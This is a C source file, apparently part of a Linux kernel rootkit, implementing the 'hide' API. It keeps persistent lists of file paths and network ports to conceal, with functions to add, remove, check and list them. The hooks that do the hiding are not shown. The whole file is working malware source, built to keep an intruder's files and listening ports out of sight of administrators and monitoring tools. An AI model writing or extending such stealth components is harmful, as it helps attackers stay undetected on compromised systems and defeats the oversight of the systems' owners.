#include "hide_api.h"

#include "config.h"
#include "ulist.h"

struct ulist hide_list;
struct ulist hide_port_list;

int hide_init(void) {
    int ret;

    ulist_init(&hide_list, HIDE_CFG_FILE);
    ret = ulist_load(&hide_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

void hide_exit(void) {
    ulist_save(&hide_list);
    ulist_clear(&hide_list);
}

int hide_file(const char *path) {
    int ret;
    char modpath[256];

    if (strcmp(path, "/") == 0)
        return -EINVAL;

    if (strlen(path) >= sizeof(modpath))
        return -ENAMETOOLONG;
    strscpy(modpath, path, sizeof(modpath));

    size_t len = strlen(modpath);
    if (len > 1 && modpath[len - 1] == '/') {
        modpath[len - 1] = '\0';
    }

    ret = ulist_add(&hide_list, modpath, 0, NULL);
    if (ret < 0)
        return ret;

    ret = ulist_save(&hide_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int unhide_file(const char *path) {
    int ret;

    ret = ulist_remove(&hide_list, path);
    if (ret < 0)
        return ret;

    ret = ulist_save(&hide_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int hide_contains_str(const char *u_path) {
    return ulist_contains(&hide_list, u_path);
}

int hide_list_get(char *buf, size_t buf_size) {
    return ulist_list(&hide_list, buf, buf_size);
}

int hide_port_init(void) {
    int ret;

    ulist_init(&hide_port_list, HIDE_PORT_CFG_FILE);
    ret = ulist_load(&hide_port_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

void hide_port_exit(void) {
    ulist_save(&hide_port_list);
    ulist_clear(&hide_port_list);
}

int hide_port(const char *port) {
    int ret;

    ret = ulist_add(&hide_port_list, port, 0, NULL);
    if (ret < 0)
        return ret;

    ret = ulist_save(&hide_port_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int unhide_port(const char *port) {
    int ret;

    ret = ulist_remove(&hide_port_list, port);
    if (ret < 0)
        return ret;

    ret = ulist_save(&hide_port_list);
    if (ret < 0)
        return ret;

    return SUCCESS;
}

int port_contains(const char *port) {
    return ulist_contains(&hide_port_list, port);
}

int port_list_get(char *buf, size_t buf_size) {
    return ulist_list(&hide_port_list, buf, buf_size);
}